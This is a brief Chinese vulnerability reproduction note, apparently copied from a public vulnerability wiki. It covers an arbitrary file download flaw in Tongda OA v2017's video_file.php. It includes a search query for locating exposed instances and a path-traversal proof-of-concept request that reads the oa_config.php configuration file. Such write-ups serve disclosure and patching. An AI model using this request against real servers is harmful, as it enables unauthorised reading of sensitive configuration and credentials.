---
title: "通达OA v2017 video_file.php 任意文件下载漏洞"
date: 2026-10-17 09:13:46
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "通达OA"
tags:
  - "通达OA"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件

## 漏洞影响

```
通达OA v2017
```

## 网络测绘

```
app="TDXK-通达OA"
```

## 漏洞复现

验证POC

```
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php	
```

![image-20220715110910861](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207151109936.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
